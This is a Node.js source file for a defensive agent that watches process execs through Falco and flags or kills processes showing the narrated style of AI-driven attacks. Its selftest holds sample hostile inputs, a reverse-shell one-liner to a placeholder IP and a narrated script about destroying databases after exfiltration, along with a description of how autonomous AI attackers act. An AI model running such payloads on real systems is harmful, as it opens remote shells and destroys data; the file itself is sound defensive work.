#!/usr/bin/env node
// Aris Sentinel — resident on-box agent (plain Node >=18, no deps).
//
// The "install and wait" product: taps process execs via Falco (eBPF), scores each
// for the agentic-narration signature with the two-tier brain (sentinel-core.mjs),
// and on a BLOCK verdict KILLS the offending process tree — stopping the attacker's
// AI at its first narrated action, before the destructive step.
//
//   sudo node sentinel-agent.mjs              # MONITOR (default) — detect + alert, no kill
//   sudo node sentinel-agent.mjs --enforce    # ENFORCE — kill the attack on detection
//   node sentinel-agent.mjs --selftest        # score sample payloads, no Falco/root
//
//   env: ANTHROPIC_API_KEY (tier 2 on Claude), OPENAI_BASE_URL+OPENAI_MODEL (local judge),
//        OPENAI_API_KEY, KIMI_API_KEY; ARIS_TIER2_ORDER picks the chain order
//        ARIS_RULES (falco rules path)      FALCO_BIN (default: falco)
//        ARIS_INCIDENTS (incident log path) ARIS_VERBOSE=1 (log every allow too)
//        ARIS_CLOUD_URL + ARIS_INGEST_KEY (off-box alerts)
//        ARIS_FAIL_MODE=alert (page instead of block when tier-2 errors/refuses)
//        ARIS_TIER2_TIMEOUT_MS / _DEADLINE_MS / _CACHE_TTL_MS / _CONCURRENCY / _BUDGET_PER_MIN
//
// Decisions (see sentinel-core.mjs):
//   Each exec is judged alone AND as part of its session (proc.sid): narration spread
//   thin across several execs goes to the judge as one transcript (ARIS_SESSION_TTL_MS=0
//   turns that off). Session evidence can alert or, with a judge, block — never tier-1 kill.
//   block → MONITOR: logged + reported.  ENFORCE: killed (unless protected).
//   alert → logged + reported, NEVER killed (tier-2 unavailable / budget spent).
//   error → the detector threw: logged + reported as an incident, never dropped silently.

import { spawn } from "node:child_process";
import { readFileSync, appendFileSync, readdirSync, statSync } from "node:fs";
import { basename, isAbsolute, resolve as resolvePath } from "node:path";
import { hostname } from "node:os";
import { createInterface } from "node:readline";
import { pathToFileURL } from "node:url";
import { decide, decideSession, defaultSessions, hasTier2, providers, providerWarnings } from "./sentinel-core.mjs";

// SAFE BY DEFAULT: the agent detects + alerts + logs but NEVER kills unless you pass
// --enforce. A false positive can't take down a customer's prod on day one; you flip
// to --enforce only once you trust it on that box. (--dry-run is accepted as an alias
// for the default monitor mode.)
const ENFORCE = process.argv.includes("--enforce");
const MONITOR = !ENFORCE;
const SELFTEST = process.argv.includes("--selftest");
const VERBOSE = process.env.ARIS_VERBOSE === "1";
const FALCO_BIN = process.env.FALCO_BIN || "falco";
const RULES = process.env.ARIS_RULES || "/home/ubuntu/aris_rules.yaml";
const INCIDENT_LOG = process.env.ARIS_INCIDENTS || "/var/log/aris-incidents.jsonl";
// Off-box reporting -> Aris Cloud. The box may be compromised, so the alert must
// egress to a place the attacker can't reach. ARIS_CLOUD_URL is the base
// (e.g. https://youraris.com); we POST incidents to /api/local/sentinel/alert.
const CLOUD_URL = process.env.ARIS_CLOUD_URL;
const CLOUD_KEY = process.env.ARIS_INGEST_KEY || "";
const HOST = process.env.ARIS_HOST || hostname();
const OWN_PID = process.pid;
const MAX_PAYLOAD = 256 * 1024;

// Blend in. A generic process title means ps/top show a mundane daemon, not a
// security tool — so an attacker's recon has nothing obvious to target, and an
// autonomous attacker (not trained to know what Aris is) can't confidently kill it.
try { process.title = process.env.ARIS_PROC_NAME || "sys-telemetryd"; } catch {}

// Never kill these (nor their ancestors): system-critical + our own toolchain.
const PROTECTED_COMMS = new Set([
  "systemd", "init", "sshd", "falco", "node", "containerd", "dockerd", "docker",
  "containerd-shim", "containerd-shim-runc-v2", "runc", "dbus-daemon", "cron",
  "agetty", "login", "sudo", "su", "snapd", "systemd-journal", "systemd-journald",
  "systemd-logind", "systemd-resolve", "polkitd", "unattended-upgr", "packagekitd",
]);
// Interpreters whose script-file argument we read (the narration usually lives in the
// file, not the cmdline), and the single-letter flags that mean "the code is inline
// in the cmdline" — then there is no script file to read. Combined flag groups count
// (`bash -lc`, `python3 -Bc`, `perl -ne`).
const INTERPRETERS = {
  python: "c", python2: "c", python3: "c",
  bash: "c", sh: "c", dash: "c", zsh: "c",
  node: "ep", perl: "eE", ruby: "e", php: "r",
};
const LONG_INLINE = new Set(["--eval", "--print", "--command", "--exec"]);

const now = () => new Date().toISOString();
const log = (m) => console.log(`[${now()}] ${m}`);

// ── /proc helpers (no shelling out — avoids exec feedback loops) ──────────────
function procStatus(pid) {
  try {
    const s = readFileSync(`/proc/${pid}/status`, "utf8");
    const name = (s.match(/^Name:\t(.*)$/m) || [])[1] || "";
    const ppid = Number((s.match(/^PPid:\t(\d+)$/m) || [])[1] || 0);
    return { name, ppid };
  } catch { return null; }
}
function ancestorsOf(pid) {
  const set = new Set();
  let cur = pid, guard = 0;
  while (cur > 1 && guard++ < 64) {
    const st = procStatus(cur);
    if (!st) break;
    set.add(cur);
    cur = st.ppid;
  }
  return set;
}
function descendantsOf(pid) {
  // build ppid->children map from /proc, BFS down
  const kids = new Map();
  for (const e of readdirSync("/proc")) {
    if (!/^\d+$/.test(e)) continue;
    const st = procStatus(Number(e));
    if (st) (kids.get(st.ppid) || kids.set(st.ppid, []).get(st.ppid)).push(Number(e));
  }
  const out = [], q = [pid];
  while (q.length) {
    const p = q.shift();
    for (const c of kids.get(p) || []) { out.push(c); q.push(c); }
  }
  return out;
}

function killTree(pid) {
  const kids = descendantsOf(pid);
  // deepest first, then the root pid last
  for (const p of [...kids.reverse(), pid]) {
    try { process.kill(p, "SIGKILL"); } catch {}
  }
  return [pid, ...kids];
}

// ── payload extraction: cmdline + (for interpreters) the script file content ──

/** True when the interpreter is running inline code (`-c`, `-e`, `-lc`, `--eval`…). */
export function hasInlineCode(exe, args) {
  const letters = INTERPRETERS[exe];
  if (letters === undefined) return false;
  for (const a of args) {
    if (LONG_INLINE.has(a)) return true;
    if (/^-[^-]/.test(a) && [...letters].some((l) => a.slice(1).includes(l))) return true;
  }
  return false;
}

/**
 * Resolve a script token against the PROCESS's cwd — never the agent's own. Falco
 * gives us %proc.cwd; if it's missing, /proc/<pid>/cwd is the kernel's answer. With
 * neither, a relative path is unresolvable and we don't guess.
 */
export function resolveScript(tok, { cwd, pid } = {}) {
  if (isAbsolute(tok)) return tok;
  if (cwd && isAbsolute(cwd)) return resolvePath(cwd, tok);
  if (pid) return `/proc/${pid}/cwd/${tok}`;
  return null;
}

function readScript(path) {
  try {
    if (!statSync(path).isFile()) return null;
    return readFileSync(path, "utf8").slice(0, MAX_PAYLOAD);
  } catch { return null; }
}

export function extractPayload(f) {
  const cmdline = f["proc.cmdline"] || "";
  const exe = basename(f["proc.exe"] || "");
  const pieces = [cmdline];
  const args = cmdline.split(/\s+/).filter(Boolean);
  // Read the script file ONLY when the interpreter is actually running a script
  // (`python3 foo.py`). Skip inline-code forms — the code is already in the cmdline,
  // and a token that merely MENTIONS another script's path (e.g. a shell command
  // referencing it) must not cause us to slurp+score that unrelated file.
  if (exe in INTERPRETERS && !hasInlineCode(exe, args.slice(1))) {
    for (const tok of args.slice(1)) {
      if (tok.startsWith("-")) continue;
      const path = resolveScript(tok, { cwd: f["proc.cwd"], pid: Number(f["proc.pid"]) || 0 });
      const text = path && readScript(path);
      if (text !== null && text !== undefined) {
        pieces.push(text);
        break;
      }
    }
  }
  return pieces.join("\n").slice(0, MAX_PAYLOAD);
}

// Per-(session, payload) dedup: one attack fans out into several execs, so without
// this the same payload is adjudicated (and logged, and billed) N times. Cache the
// key SYNCHRONOUSLY before the async decide(), so concurrent duplicate events collapse
// to a single tier-2 call and a single clean log line. killTree already covers the tree.
const decided = new Map();
const DEDUP_MAX = 4000;
const DEDUP_WINDOW_MS = 15_000; // collapse one launch's exec fan-out; re-catch a later re-run
function hash(s) { let h = 5381; for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0; return h >>> 0; }

// ── response ─────────────────────────────────────────────────────────────────
const selfAncestors = ancestorsOf(OWN_PID);

function isProtected(pid, comm) {
  if (pid <= 1) return "pid<=1";
  if (pid === OWN_PID) return "self";
  if (selfAncestors.has(pid)) return "agent-ancestor";
  if (PROTECTED_COMMS.has(comm)) return `protected-comm:${comm}`;
  return null;
}

// The attacker's own words — the comment/narration lines from the payload. This is
// the product superpower: the alert can say what the enemy AI was TRYING to do.
function narrationSnippet(payload) {
  const lines = payload.split("\n").map((l) => l.trim());
  const narrated = lines.filter((l) => /^(#|\/\/|--|\*)/.test(l) || /\bI (will|need to|am|have|'ll)\b/i.test(l));
  const text = (narrated.length ? narrated : lines.filter(Boolean)).join(" ").replace(/^[#/*\-\s]+/gm, "").trim();
  return text.slice(0, 600);
}

// Fire-and-forget report to Aris Cloud. Called BEFORE the kill so the alert is already
// in flight even if terminating the process triggers attacker retaliation. Never throws.
function reportToCloud(incident) {
  if (!CLOUD_URL) return;
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), 5000);
  fetch(`${CLOUD_URL}/api/local/sentinel/alert`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-aris-key": CLOUD_KEY },
    body: JSON.stringify(incident),
    signal: ctl.signal,
  }).then((r) => { if (!r.ok) log(`cloud alert failed: HTTP ${r.status}`); })
    .catch((e) => log(`cloud alert error: ${e.name === "AbortError" ? "timeout" : e.message}`))
    .finally(() => clearTimeout(t));
}

function writeIncident(incident) {
  try { appendFileSync(INCIDENT_LOG, JSON.stringify(incident) + "\n"); } catch (e) { log(`incident log write failed: ${e.message}`); }
}

function procFields(f) {
  const comm = basename(f["proc.exe"] || f["proc.pname"] || "");
  return {
    pid: Number(f["proc.pid"]), ppid: Number(f["proc.ppid"]), sid: Number(f["proc.sid"]),
    user: f["user.name"], exe: comm, cwd: f["proc.cwd"] ?? null, cmdline: f["proc.cmdline"],
  };
}

function respond(f, d, payload) {
  const p = procFields(f);
  const how = d.tier === 2 ? (d.adjudication?.refused ? "fail-closed" : `conf=${d.adjudication?.confidence?.toFixed(2)}`) : "";
  const decoded = d.decoded ? " (decoded)" : "";
  const sess = d.viaSession ? `  via-session(${d.session.size} payloads)` : "";

  // `alert` is never a kill: tier 2 could not judge it, so we page a human instead.
  const guard = d.decision === "block" ? isProtected(p.pid, p.exe) : null;
  const action =
    d.decision === "alert" ? "ALERT (tier-2 unavailable — no kill)"
    : MONITOR ? "DETECTED (monitor — no kill)"
    : guard ? `SPARED (${guard})`
    : "KILL";
  log(`SENTINEL ${action}  tier-${d.tier}  pid=${p.pid} ppid=${p.ppid} sid=${p.sid} user=${p.user} exe=${p.exe}${decoded}${sess}  score=${d.score.toFixed(2)}${how ? " " + how : ""}`);
  log(`            cmd: ${(p.cmdline || "").slice(0, 200)}`);
  if (d.reason) log(`            ${d.reason}`);
  if (d.adjudication?.reasoning) log(`            reasoning: ${d.adjudication.reasoning}`);

  const base = {
    host: HOST, ts: now(), decision: d.decision, tier: d.tier,
    action: d.decision === "alert" ? "alerted" : MONITOR ? "monitored" : guard ? `spared:${guard}` : "killed",
    ...p, score: d.score, signals: d.signals, reason: d.reason,
    conf: d.adjudication?.confidence ?? null, reasoning: d.adjudication?.reasoning ?? null,
    // When the session convicted, the evidence is the session's words, not this one exec's.
    narration: narrationSnippet(d.viaSession ? d.scoredLayer : payload),
    via_session: !!d.viaSession, session: d.session ?? null,
  };

  // Egress the alert to Aris Cloud FIRST — before we touch the process.
  reportToCloud(base);

  let killed = [];
  if (ENFORCE && d.decision === "block" && !guard) killed = killTree(p.pid);

  writeIncident({ ...base, tier2: d.adjudication || null, killed });
}

// A detector exception must never become a silent allow. It is logged, written as an
// incident with decision "error", and reported off-box, so a crash on the one payload
// that matters is visible — and, if an attacker found a way to crash the scorer, that
// in itself is the alarm. Nothing is killed on an error (the verdict is unknown).
function respondError(f, e, payload) {
  const p = procFields(f);
  const error = String(e && e.stack ? e.stack : e).slice(0, 2000);
  log(`SENTINEL ERROR  detector threw on pid=${p.pid} exe=${p.exe}: ${String(e && e.message ? e.message : e).slice(0, 200)}`);
  const incident = {
    host: HOST, ts: now(), decision: "error", tier: null, action: "errored",
    ...p, score: null, signals: [], reason: "detector exception — payload not judged", error,
    conf: null, reasoning: null, narration: narrationSnippet(payload),
  };
  reportToCloud(incident);
  writeIncident(incident);
}

// The session a process belongs to: its session id (setsid leader). An agent driving a
// shell, or the children of one exploited server, share it. Unknown / pid-1 sids get no
// session (the payload is judged alone).
export const sessionKeyOf = (f) => {
  const sid = Number(f["proc.sid"]);
  return Number.isInteger(sid) && sid > 1 ? `sid:${sid}` : null;
};

// Injectable seams for tests (swap `deps.decide` to simulate a throwing detector).
export const deps = { decide: (payload, sessionKey) => decideSession(sessionKey, payload) };

// ── event handling ───────────────────────────────────────────────────────────
export async function handleEvent(f) {
  const pid = Number(f["proc.pid"]);
  if (!pid || pid === OWN_PID) return;
  const payload = extractPayload(f);
  if (payload.trim().length < 3) return;

  // collapse duplicate execs of the same attack (same session + same payload) so we
  // adjudicate once. Set the key BEFORE awaiting so concurrent events don't race in.
  const key = `${f["proc.sid"]}:${hash(payload)}`;
  const prev = decided.get(key);
  if (prev && Date.now() - prev < DEDUP_WINDOW_MS) return;
  decided.set(key, Date.now());
  if (decided.size > DEDUP_MAX) decided.delete(decided.keys().next().value);

  let d;
  try { d = await deps.decide(payload, sessionKeyOf(f)); } catch (e) { return respondError(f, e, payload); }
  if (d.decision === "block" || d.decision === "alert") return respond(f, d, payload);
  if (VERBOSE) log(`allow  tier-${d.tier}  pid=${pid} exe=${basename(f["proc.exe"] || "")}  score=${d.score.toFixed(2)}  ${d.reason}`);
  return d;
}

// ── selftest: score sample payloads, no Falco/root/kill ──────────────────────
async function selftest() {
  log("SELFTEST — scoring sample execs (no Falco, no kill)\n");
  const samples = [
    { name: "narrated agent (expect BLOCK)", cmdline: `python3 -c # Phase 4 Impact. I have ranked the databases by value. High-ROI targets to drop, data already backed up to my exfil host. I will proceed to maximize pressure on the victim.` },
    { name: "benign command (expect allow)", cmdline: `python3 manage.py migrate --noinput` },
    { name: "terse malware (expect allow, tier-1 only)", cmdline: `bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` },
  ];
  for (const s of samples) {
    const d = await decide(extractPayload({ "proc.cmdline": s.cmdline, "proc.exe": s.cmdline.split(" ")[0] }));
    log(`[${d.decision.toUpperCase().padEnd(5)}] tier-${d.tier} score=${d.score.toFixed(2)}  ${s.name}`);
    log(`         signals=[${d.signals.join(", ")}]  ${d.reason}\n`);
  }
  log("selftest done. Arm with: sudo node sentinel-agent.mjs");
}

// ── main ─────────────────────────────────────────────────────────────────────
function main() {
  log(`Aris Sentinel agent starting`);
  log(`  mode: ${ENFORCE ? "ENFORCE (kills the attack on detection)" : "MONITOR (detect + alert only — no kill; pass --enforce to arm)"}`);
  log(`  tier 2: ${hasTier2() ? `ENABLED (${providers().map((p) => p.name).join(" -> ")})` : "disabled (tier-1 only; set ANTHROPIC_API_KEY, or OPENAI_BASE_URL+OPENAI_MODEL for a local judge) — escalate band -> alert"}`);
  for (const w of providerWarnings()) log(`  WARN ${w}`);
  log(`  fail mode: ${process.env.ARIS_FAIL_MODE === "alert" ? "alert (tier-2 errors page, never block)" : "closed (tier-2 errors block as suspicious)"}`);
  log(`  session evidence: ${defaultSessions.enabled ? "ON (narration accumulated per proc.sid; judged as a transcript, never a tier-1 kill)" : "off (ARIS_SESSION_TTL_MS=0)"}`);
  log(`  cloud alerts: ${CLOUD_URL ? `-> ${CLOUD_URL} (Telegram via Aris Cloud)` : "disabled (set ARIS_CLOUD_URL)"}`);
  log(`  incidents -> ${INCIDENT_LOG}`);

  const falco = spawn(FALCO_BIN, [
    "-r", RULES,
    "-o", "priority=debug", "-o", "json_output=true", "-o", "json_include_output_property=true",
    "-o", "stdout_output.enabled=true", "-o", "log_level=error", "-o", "webserver.enabled=false",
    // Falco defaults to syslog; as our child it lands in our cgroup and floods the
    // journal with a raw JSON line per exec. We consume events via the stdout pipe
    // only — silence every other Falco output sink.
    "-o", "syslog_output.enabled=false", "-o", "file_output.enabled=false",
  ], { stdio: ["ignore", "pipe", "pipe"] });

  falco.on("error", (e) => { log(`FATAL: cannot start Falco (${e.message}). Is it installed and are we root?`); process.exit(1); });
  falco.stderr.on("data", (b) => { const s = b.toString().trim(); if (/error|fail/i.test(s)) log(`falco: ${s.split("\n")[0]}`); });

  createInterface({ input: falco.stdout }).on("line", (line) => {
    if (!line.includes("aris_exec_capture")) return;
    let ev;
    try { ev = JSON.parse(line); } catch { return; }
    if (ev.rule === "aris_exec_capture" && ev.output_fields) handleEvent(ev.output_fields);
  });

  log(`  armed — watching process execs via Falco. Ctrl-C to stop.`);
  process.on("SIGINT", () => { falco.kill("SIGTERM"); process.exit(0); });
}

// Only run when executed directly (node sentinel-agent.mjs / agentd.mjs), not when
// imported by the unit tests.
const isMain = process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href;
if (isMain) {
  if (SELFTEST) selftest();
  else main();
}
